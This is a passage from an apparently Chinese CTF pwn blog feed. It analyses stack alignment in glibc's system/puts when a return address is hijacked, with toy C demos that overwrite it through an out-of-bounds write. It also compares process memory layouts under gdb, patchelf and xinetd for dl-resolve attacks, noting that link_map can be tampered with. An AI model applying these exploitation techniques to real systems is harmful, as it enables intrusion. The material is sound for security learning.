   0x7ffff7dd3b20 &lt;do_system+544&gt;    mov    rdx, r14                            RDX <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
   0x7ffff7dd3b23 &lt;do_system+547&gt;    mov    edi, 2                              EDI <span class="o">=&gt;</span> 2
</code></pre></div></div> <h5 id="然后是有关rsp的操作这里是存放两个值到xmm4然后调用子函数__gi___libc_cleanup_push_defer-这是一个用于清理线程的函数-之后便没有相关操作了">   然后是有关<code class="language-plaintext highlighter-rouge">[rsp]</code>的操作，这里是存放两个值到xmm4，然后调用子函数<code class="language-plaintext highlighter-rouge">__GI___libc_cleanup_push_defer</code>, 这是一个用于清理线程的函数, 之后便没有相关操作了。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x7ffff7dd3b84 &lt;do_system+644&gt;:      movdqa xmm4,XMMWORD PTR <span class="o">[</span>rsp]
......
0x7ffff7dd3bb0 &lt;do_system+688&gt;:      movaps XMMWORD PTR <span class="o">[</span>rsp+0x20],xmm4
 0x7ffff7dd3bb5 &lt;do_system+693&gt;:      call   0x7ffff7e141c0 &lt;__GI___libc_cleanup_push_defer&gt;
</code></pre></div></div> <h5 id="再次总结system中通过r13r14将intr和quit放到xmm然后放到rsp方便后续的管理进程和线程-至于为什么非要放到xmm个人理解是这两个值是一起被使用的类似于一个结构体所以放在一个128bit寄存器比两个64bit更好至于intr和quit两个变量都放在glibc的bss默认都是0xrefs发现它们只在do_system中被使用但是都没有赋值感觉很奇怪">   再次总结，<code class="language-plaintext highlighter-rouge">system()</code>中通过r13,r14将&lt;intr&gt;和&lt;quit&gt;放到xmm，然后放到<code class="language-plaintext highlighter-rouge">[rsp]</code>，方便后续的管理进程和线程, 至于为什么非要放到xmm，个人理解是这两个值是一起被使用的，类似于一个结构体，所以放在一个128bit寄存器比两个64bit更好。<br/>   至于&lt;intr&gt;和&lt;quit&gt;，两个变量都放在glibc的.bss，默认都是0。Xrefs发现它们只在<code class="language-plaintext highlighter-rouge">do_system</code>中被使用，但是都没有赋值，感觉很奇怪。</h5> <p>ps: (来自很遥远的未来) 这种向量运算其实不算特别少见, 尤其是比较底层的各种库, 为了想办法尽量增加效率, 这种SIMD不在少数. 但是至少在X86_64上, 很多SIMD并不要求16字节对齐, 别的架构不太清楚, 其次一般也只有栈上的利用才容易导致不对齐的问题.</p> <h3 id="需要栈平衡的函数">需要栈平衡的函数</h3> <h5 id="在实际实践时发现不只有system需要16位诸如puts-scanf-printf等也会有类似的需求">   在实际实践时发现，不只有<code class="language-plaintext highlighter-rouge">system()</code>需要16位，诸如<code class="language-plaintext highlighter-rouge">puts</code>, <code class="language-plaintext highlighter-rouge">scanf</code>, <code class="language-plaintext highlighter-rouge">printf</code>等也会有类似的需求。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// demo2</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">backdoor</span><span class="p">(){</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"LeakBox"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="n">array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">backdoor</span><span class="p">;</span> <span class="c1">// 数组越界</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="结果是">   结果是</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ► 0x7ffff7e274c0 &lt;_int_malloc+2832&gt;    movaps xmmword ptr <span class="o">[</span>rsp + 0x10], xmm1     &lt;<span class="o">[</span>0x7fffffffd758] not aligned to 16 bytes&gt;
   0x7ffff7e274c5 &lt;_int_malloc+2837&gt;    mov    eax, dword ptr <span class="o">[</span>rbx + 8]           EAX, <span class="o">[</span>main_arena+8] <span class="o">=&gt;</span> 0
   0x7ffff7e274c8 &lt;_int_malloc+2840&gt;    <span class="nb">test   </span>eax, eax                           0 &amp; 0     EFLAGS <span class="o">=&gt;</span> 0x10246 <span class="o">[</span> cf PF af ZF sf IF <span class="nb">df </span>of <span class="o">]</span>
   0x7ffff7e274ca &lt;_int_malloc+2842&gt;  ✔ je     _int_malloc+3869            &lt;_int_malloc+3869&gt;

 ► 0   0x7ffff7e274c0 _int_malloc+2832
   1   0x7ffff7e279c9 tcache_init.part+57
   2   0x7ffff7e281de malloc+318
   3   0x7ffff7e281de malloc+318
   4   0x7ffff7e01ba4 _IO_file_doallocate+148
   5   0x7ffff7e10ce0 _IO_doallocbuf+80
   6   0x7ffff7e0ff60 _IO_file_overflow+416
   7   0x7ffff7e0e6d5 _IO_file_xsputn+213
   8   0x7ffff7e03f1c __GI__IO_puts+204
   9   0x555555555180 backdoor+23
</code></pre></div></div> <h5 id="不难发现-涉及malloc_io_file_xsputn都需要检查直白点说就是涉及io的都会有栈平衡问题但不保证是_io_file_xsputsn的问题比如vprintf本身就有xmm寄存器对齐要求其次堆分配malloc也会有这类问题但一般不会很显著">   不难发现, 涉及<code class="language-plaintext highlighter-rouge">malloc</code>，<code class="language-plaintext highlighter-rouge">_IO_file_xsputn</code>都需要检查，直白点说就是涉及IO的都会有栈平衡问题，但不保证是<code class="language-plaintext highlighter-rouge">_IO_file_xsputsn</code>的问题，比如vprintf本身就有xmm寄存器对齐要求<br/>   其次，堆分配(malloc)也会有这类问题，但一般不会很显著<br/></h5> <h5 id="你以为这就完了吗-怎么会如果io能跳过_io_file_xsputn不就可以正常运行了吗实际上write和read就是这样的-因为这两个单纯就是把syscall包装了一下">   你以为这就完了吗? 怎么会。如果IO能跳过<code class="language-plaintext highlighter-rouge">_IO_file_xsputn</code>，不就可以正常运行了吗,实际上<code class="language-plaintext highlighter-rouge">write</code>和<code class="language-plaintext highlighter-rouge">read</code>就是这样的, 因为这两个单纯就是把<code class="language-plaintext highlighter-rouge">syscall</code>包装了一下</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000001147D0 <span class="p">;</span> __unwind <span class="o">{</span>
.text:00000000001147D0                 endbr64                 <span class="p">;</span> Alternative name is <span class="s1">'__read'</span>
.text:00000000001147D4                 mov     eax, fs:18h
.text:00000000001147DC                 <span class="nb">test    </span>eax, eax
.text:00000000001147DE                 jnz     short loc_1147F0
.text:00000000001147E0                 syscall                 <span class="p">;</span> LINUX -
.text:00000000001147E2                 cmp     rax, 0FFFFFFFFFFFFF000h
.text:00000000001147E8                 ja      short loc_114840
.text:00000000001147EA                 retn
.text:00000000001147EA <span class="p">;</span>
</code></pre></div></div> <h5 id="再看一个demo">   再看一个demo</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// demo3</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">backdoor</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">website</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">website</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">website</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">website</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="n">array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">backdoor</span><span class="p">;</span> <span class="c1">// 数组越界</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">test</span>
<span class="n">godbolt</span><span class="p">.</span><span class="n">org</span>
<span class="n">godbolt</span><span class="p">.</span><span class="n">org</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>    <span class="mi">5924</span> <span class="n">segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="p">.</span><span class="o">/</span><span class="n">test</span>

</code></pre></div></div> <h5 id="输入的是godboltorg-由于由于用的是read-不会在输入-n-时结束io-所以shell里输入结束后需要ctrl--d手动发出eof可以看到-无论read还是write都成功执行了-虽然segv了-是因为backdoor不是正常被调用的-所以ret地址位置没有填有效地址-最后返回的地址不合理">   输入的是godbolt.org, 由于由于用的是<code class="language-plaintext highlighter-rouge">read</code>, 不会在输入 ‘\n’ 时结束IO, 所以shell里输入结束后需要<code class="language-plaintext highlighter-rouge">Ctrl + D</code>手动发出EOF<br/>   可以看到, 无论<code class="language-plaintext highlighter-rouge">read</code>还是<code class="language-plaintext highlighter-rouge">write</code>都成功执行了, 虽然SEGV了, 是因为backdoor不是正常被调用的, 所以ret地址位置没有填有效地址, 最后返回的地址不合理<br/></h5>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><category term="X86"/><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">dl题内存布局初探</title><link href="https://leakbox258.github.io/blog/2024/%E5%AF%B9%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E7%9A%84%E4%B8%80%E7%82%B9%E6%8E%A2%E7%B4%A2/" rel="alternate" type="text/html" title="dl题内存布局初探"/><published>2024-10-08T00:00:00+00:00</published><updated>2024-10-08T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/%E5%AF%B9%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E7%9A%84%E4%B8%80%E7%82%B9%E6%8E%A2%E7%B4%A2</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/%E5%AF%B9%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E7%9A%84%E4%B8%80%E7%82%B9%E6%8E%A2%E7%B4%A2/"><![CDATA[<h3 id="前情提要">前情提要</h3> <h5 id="众所周知在选择dl攻击时往往没有回显也就是无法得到attachmentlibcld的在内存中的加载基址一般来说这三者的加载地址应该是互不相关的但根据个人经验来看libc和ld一般是连在一起的中间可能有别的内存页也就是知道其中一个的基址以及内存的布局就可以知道另一个的基址">   众所周知，在选择dl攻击时，往往没有回显，也就是无法得到attachment、libc、ld的在内存中的加载基址，<br/>   一般来说，这三者的加载地址应该是互不相关的，但根据个人经验来看，libc和ld一般是连在一起的（中间可能有别的内存页），也就是知道其中一个的基址以及内存的布局，就可以知道另一个的基址<br/></h5> <h5 id="那么__dl_runtime_resolve时如何找到这三者的关系依靠的是在ld中的linkmap表这个表记录三个文件或许更多的linkmap地址而linkmap中就含有加载基址的信息">   那么<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>时如何找到，这三者的关系，依靠的是在ld中的linkmap表，这个表记录三个文件（或许更多）的linkmap地址，而linkmap中就含有加载基址的信息。</h5> <h5 id="以下的所有调试和maps的查看均以之前的boss题为例但实际上重点在于该程序mmap一个0x2000大小可读写的内存段本文的一个重心将会是这个mmap得到的内存的相对位置">   以下的所有调试和maps的查看均以之前的boss题为例，但实际上重点在于该程序<code class="language-plaintext highlighter-rouge">mmap()</code>一个0x2000大小可读写的内存段，本文的一个重心将会是这个<code class="language-plaintext highlighter-rouge">mmap()</code>得到的内存的相对位置。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">linkmap</span>
<span class="n">Node</span>           <span class="n">Objfile</span>                                                            <span class="n">Load</span> <span class="n">Bias</span>      <span class="n">Dynamic</span> <span class="n">Segment</span> 
<span class="mh">0x7ffff7ffe2e0</span> <span class="o">&lt;</span><span class="n">Unknown</span><span class="p">,</span> <span class="n">likely</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">worktable</span><span class="o">/</span><span class="n">cnss2024</span><span class="o">/</span><span class="n">boss</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">attachment</span><span class="o">&gt;</span> <span class="mh">0x555555554000</span> <span class="mh">0x555555557df8</span>  
<span class="mh">0x7ffff7ffe890</span> <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">1</span>                                                    <span class="mh">0x7ffff7fc1000</span> <span class="mh">0x7ffff7fc13a0</span>  
<span class="mh">0x7ffff7fbb160</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>                                    <span class="mh">0x7ffff7d83000</span> <span class="mh">0x7ffff7f9cbc0</span>  
<span class="mh">0x7ffff7ffdaf0</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>                                        <span class="mh">0x7ffff7fc3000</span> <span class="mh">0x7ffff7ffce80</span>  
</code></pre></div></div> <h5 id="值得注意的是linkmap的位置在ldso中的一段可读写的位置也就是说算好偏移就可以篡改linkmap">   值得注意的是，linkmap的位置在ld.so中的一段可读写的位置，也就是说算好偏移就可以篡改linkmap。</h5> <h3 id="调试方法不同时内存布局的不同">调试方法不同时内存布局的不同</h3> <h5 id="首先探索的是调试方法不同时内存布局的不同一般使用gdb有两种方法gdb-attachment以及gdb---pidxxxx也就是gdb直接调试文件或者链接进程进行调试实际上这两者就算仅仅是从效果上看就有很大不同">   首先探索的是调试方法不同时，内存布局的不同<br/>   一般使用<code class="language-plaintext highlighter-rouge">gdb</code>有两种方法，<code class="language-plaintext highlighter-rouge">gdb attachment</code>以及<code class="language-plaintext highlighter-rouge">gdb --pid=xxxx</code>，也就是<code class="language-plaintext highlighter-rouge">gdb</code>直接调试文件或者链接进程进行调试，实际上这两者就算仅仅是从效果上看就有很大不同。<br/></h5> <h5 id="首先看gdb---pidxxx的vmmap这个结果更加接近一个进程的真实vmmap也就是和cat-procxxxmaps的结果相近">   首先看<code class="language-plaintext highlighter-rouge">gdb --pid=xxx</code>的vmmap，这个结果更加接近一个进程的真实vmmap，也就是和<code class="language-plaintext highlighter-rouge">cat /proc/xxx/maps</code>的结果相近</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x5631723b9000     0x5631723ba000 r--p     1000      0 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x5631723ba000     0x5631723bb000 r-xp     1000   1000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x5631723bb000     0x5631723bc000 r--p     1000   2000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x5631723bc000     0x5631723bd000 r--p     1000   2000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x5631723bd000     0x5631723be000 rw-p     1000   3000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x7f99a605f000     0x7f99a6062000 rw-p     3000      0 <span class="o">[</span>anon_7f99a605f]
    0x7f99a6062000     0x7f99a608a000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a608a000     0x7f99a621f000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a621f000     0x7f99a6277000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a6277000     0x7f99a6278000 <span class="nt">---p</span>     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a6278000     0x7f99a627c000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a627c000     0x7f99a627e000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a627e000     0x7f99a628b000 rw-p     d000      0 <span class="o">[</span>anon_7f99a627e]
    0x7f99a6298000     0x7f99a629c000 rw-p     4000      0 <span class="o">[</span>anon_7f99a6298] <span class="c"># &lt;---mmap得到的空间</span>
    0x7f99a629c000     0x7f99a629e000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f99a629e000     0x7f99a62c8000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f99a62c8000     0x7f99a62d3000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f99a62d4000     0x7f99a62d6000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f99a62d6000     0x7f99a62d8000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffd84bf2000     0x7ffd84c14000 rw-p    22000      0 <span class="o">[</span>stack]
    0x7ffd84c46000     0x7ffd84c4a000 r--p     4000      0 <span class="o">[</span>vvar]
    0x7ffd84c4a000     0x7ffd84c4c000 r-xp     2000      0 <span class="o">[</span>vdso]
</code></pre></div></div> <h5 id="然后是使用gdb-attachment的效果可以看到的是mmap得到的空间和ldso之间多了0x6000的vvar和vsdo这两个本来是在栈段下方的其次如果多次调试发现attachmentlibcld的加载地址实际上是固定的也就是0x5555555540000x7ffff7d830000x7ffff7fc3000实际上没变应该是出于方便调试所以固定了加载地址">   然后是使用<code class="language-plaintext highlighter-rouge">gdb attachment</code>的效果，可以看到的是mmap得到的空间和ld.so之间多了0x6000的<code class="language-plaintext highlighter-rouge">[vvar]和[vsdo]</code>，这两个本来是在栈段下方的。<br/>   其次，如果多次调试发现，attachment、libc、ld的加载地址实际上是固定的，也就是0x555555554000、0x7ffff7d83000、0x7ffff7fc3000实际上没变，应该是出于方便调试所以固定了加载地址。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x555555556000     0x555555557000 r--p     1000   2000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x555555557000     0x555555558000 r--p     1000   2000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x555555558000     0x555555559000 rw-p     1000   3000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x7ffff7d80000     0x7ffff7d83000 rw-p     3000      0 <span class="o">[</span>anon_7ffff7d80]
    0x7ffff7d83000     0x7ffff7dab000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dab000     0x7ffff7f40000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f40000     0x7ffff7f98000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f98000     0x7ffff7f99000 <span class="nt">---p</span>     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9f000     0x7ffff7fac000 rw-p     d000      0 <span class="o">[</span>anon_7ffff7f9f]
    0x7ffff7fb9000     0x7ffff7fbd000 rw-p     4000      0 <span class="o">[</span>anon_7ffff7fb9] <span class="c"># &lt;-- mmap得到的地方</span>
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 <span class="o">[</span>vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 <span class="o">[</span>vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 <span class="o">[</span>stack]
</code></pre></div></div> <h3 id="使用patchelf后的内存布局">使用patchelf后的内存布局</h3> <h5 id="一般pwn题时尤其c的pwn题时会选择使用patchelf更改libc和ld为指定glibc版本的来获得和远程相近的本地环境但是patchelf也会使进程的内存布局发生变化">   一般pwn题时，尤其C的pwn题时，会选择使用<code class="language-plaintext highlighter-rouge">patchelf</code>，更改libc和ld为指定glibc版本的来获得和远程相近的本地环境，但是<code class="language-plaintext highlighter-rouge">patchelf</code>也会使进程的内存布局发生变化。<br/></h5> <h5 id="首先获得一个patchelf后的文件">   首先获得一个<code class="language-plaintext highlighter-rouge">patchelf</code>后的文件</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ldd attachment <span class="c"># patchelf之前</span>
        linux-vdso.so.1 <span class="o">(</span>0x00007ffd469a6000<span class="o">)</span>
        libc.so.6 <span class="o">=&gt;</span> /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f8a8e7db000<span class="o">)</span>
        /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f8a8ea1a000<span class="o">)</span>
<span class="nv">$ </span>patchelf <span class="nt">--replace-needed</span> libc.so.6 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6 attachment
<span class="nv">$ </span>patchelf <span class="nt">--set-interpreter</span> /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2 attachment
<span class="nv">$ </span>ldd attachment
        linux-vdso.so.1 <span class="o">(</span>0x00007ffd73beb000<span class="o">)</span>
        /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6 <span class="o">(</span>0x00007f9a1054c000<span class="o">)</span>
        /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2 <span class="o">=&gt;</span> /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f9a1077d000<span class="o">)</span>
</code></pre></div></div> <h5 id="然后gdb---pixxx尝试调试">   然后<code class="language-plaintext highlighter-rouge">gdb --pi=xxx</code>尝试调试。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x56272a397000     0x56272a398000 r--p     1000      0 /home/pwn/testtable/attachment
    0x56272a398000     0x56272a399000 r-xp     1000   1000 /home/pwn/testtable/attachment
    0x56272a399000     0x56272a39a000 r--p     1000   2000 /home/pwn/testtable/attachment
    0x56272a39a000     0x56272a39b000 r--p     1000   2000 /home/pwn/testtable/attachment
    0x56272a39b000     0x56272a39e000 rw-p     3000   3000 /home/pwn/testtable/attachment
    0x7fc2b8155000     0x7fc2b815a000 rw-p     5000      0 <span class="o">[</span>anon_7fc2b8155] <span class="c"># &lt;-----mmap的位置</span>
    0x7fc2b815a000     0x7fc2b8182000 r--p    28000      0 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b8182000     0x7fc2b8317000 r-xp   195000  28000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b8317000     0x7fc2b836f000 r--p    58000 1bd000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b836f000     0x7fc2b8373000 r--p     4000 214000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b8373000     0x7fc2b8375000 rw-p     2000 218000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b8375000     0x7fc2b8384000 rw-p     f000      0 <span class="o">[</span>anon_7fc2b8375]
    0x7fc2b8384000     0x7fc2b8386000 r--p     2000      0 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
    0x7fc2b8386000     0x7fc2b83b0000 r-xp    2a000   2000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
    0x7fc2b83b0000     0x7fc2b83bb000 r--p     b000  2c000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
    0x7fc2b83bc000     0x7fc2b83be000 r--p     2000  37000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
    0x7fc2b83be000     0x7fc2b83c0000 rw-p     2000  39000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
    0x7fff90916000     0x7fff90938000 rw-p    22000      0 <span class="o">[</span>stack]
    0x7fff90968000     0x7fff9096c000 r--p     4000      0 <span class="o">[</span>vvar]
    0x7fff9096c000     0x7fff9096e000 r-xp     2000      0 <span class="o">[</span>vdso]
</code></pre></div></div> <h5 id="可以看到mmap获得的空间现在变成了在libc上方原因暂时未知">   可以看到，mmap获得的空间现在变成了在libc上方，原因暂时未知。</h5> <h3 id="xinted转发会话时启动的进程">xinted转发会话时启动的进程</h3> <h5 id="之前docker内可行的exp在访问端口本地docker或者服务器远程上的题目时发现无法打通于是猜测是xinted转发的进程内存布局不同">   之前docker内可行的exp,在访问端口(本地docker或者服务器远程)上的题目时,发现无法打通,于是猜测是xinted转发的进程内存布局不同<br/></h5> <h5 id="在正式查看之前先做准备工作第一步先修改以下xinted的设置">   在正式查看之前,先做准备工作,第一步先修改以下xinted的设置</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service ctf
<span class="o">{</span>
    disable <span class="o">=</span> no
    socket_type <span class="o">=</span> stream
    protocol    <span class="o">=</span> tcp
    <span class="nb">wait</span>        <span class="o">=</span> no
    user        <span class="o">=</span> root
    <span class="nb">type</span>        <span class="o">=</span> UNLISTED
    port        <span class="o">=</span> 9999
    <span class="nb">bind</span>        <span class="o">=</span> 0.0.0.0
    <span class="c"># 设置xinetd连接启动后的服务程序</span>
    server      <span class="o">=</span> /usr/sbin/chroot
    <span class="c"># 设置chroot的相关参数</span>
    server_args <span class="o">=</span> <span class="nt">--userspec</span><span class="o">=</span>0000:0000 /home/ctf ./attachment <span class="c"># &lt;---- 这里改为以root用户执行文件,否则之后看maps没权限</span>
    banner_fail <span class="o">=</span> /etc/banner_fail
    <span class="c"># safety options</span>
    per_source	<span class="o">=</span> 10 <span class="c"># the maximum instances of this service per source IP address</span>
    rlimit_cpu	<span class="o">=</span> 20 <span class="c"># the maximum number of CPU seconds that the service may use</span>
    <span class="c">#rlimit_as  = 1024M # the Address Space resource limit for the service</span>
    <span class="c">#access_times = 2:00-9:00 12:00-24:00</span>
<span class="o">}</span>

</code></pre></div></div> <h5 id="然后构建镜像">   然后构建镜像</h5> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>docker build <span class="nt">-t</span> boss <span class="nb">.</span>
<span class="nv">$ </span>docker run <span class="nt">-p</span> 8000:9999 boss
<span class="c"># 切换一个shell</span>
<span class="nv">$ </span>docker <span class="nb">exec</span> <span class="nt">-it</span> &lt;容器名&gt; /bin/bash
&lt;容器名&gt;/home/ctf<span class="nv">$ </span>apt-get <span class="nb">install </span>gdb
</code></pre></div></div> <h5 id="再打开一个shellnc-localhost-8000现在docker容器中就存在一个attachment的进程由xindted转发-此时先找到pid">   再打开一个shell,<code class="language-plaintext highlighter-rouge">nc localhost 8000</code>,现在docker容器中就存在一个attachment的进程,由xindted转发<br/>    此时先找到pid</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;容器名&gt;/home/ctf<span class="nv">$ </span>ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   4364  3164 ?        Ss   00:16   0:00 /bin/bash /docker-entrypoint.sh
root        19  0.0  0.0   2792  1036 ?        S    00:16   0:00 <span class="nb">sleep </span>infinity
